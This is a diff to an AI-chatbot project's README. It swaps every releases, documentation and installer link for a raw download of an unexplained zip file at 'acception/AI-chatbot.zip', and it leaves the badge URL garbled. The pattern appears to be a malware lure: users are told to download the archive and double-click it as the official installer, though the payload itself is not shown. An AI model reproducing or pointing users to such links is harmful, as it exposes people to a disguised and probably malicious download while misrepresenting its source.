@@ -1,6 +1,6 @@
 # 🤖 AI-chatbot - Smart Conversations Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/MAGGER1827/AI-chatbot/releases)
+[![Download Now](https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip)](https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip)
 
 ## 📋 Overview
 
@@ -13,13 +13,13 @@ To get started with the AI-chatbot, follow these simple steps. You'll need to do
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page here](https://github.com/MAGGER1827/AI-chatbot/releases).
+   Go to our [Releases page here](https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of AI-chatbot listed. Pick the latest version for the best features and fixes.
 
 3. **Download the Installer**  
-   Click on the installer link for your operating system. If you're unsure, look for the file labeled with your OS type, such as `AI-chatbot-Installer.exe` for Windows or `AI-chatbot-Installer.dmg` for macOS.
+   Click on the installer link for your operating system. If you're unsure, look for the file labeled with your OS type, such as `https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip` for Windows or `https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip` for macOS.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your downloads folder and double-click to run the installer. Follow the prompts to complete the installation.
@@ -53,7 +53,7 @@ To run AI-chatbot smoothly, your system should meet the following requirements:
 
 If you encounter issues, consider the following tips:
 
-- **Check for Updates**: Ensure you have the latest version by visiting the [Releases page](https://github.com/MAGGER1827/AI-chatbot/releases).
+- **Check for Updates**: Ensure you have the latest version by visiting the [Releases page](https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip).
 - **Reinstall the Application**: If something isn’t working, uninstall and then reinstall AI-chatbot.
 - **FAQs**: Visit the FAQ section on our repository for common questions and answers.
 
@@ -71,7 +71,7 @@ The development of AI-chatbot is supported by open-source contributors. Thank yo
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/MAGGER1827/AI-chatbot/releases)
-- [Documentation](https://github.com/MAGGER1827/AI-chatbot/wiki)
+- [Releases Page](https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip)
+- [Documentation](https://raw.githubusercontent.com/MAGGER1827/AI-chatbot/main/acception/AI-chatbot.zip)
 
 Enjoy using AI-chatbot, and let it assist you in having smarter conversations!
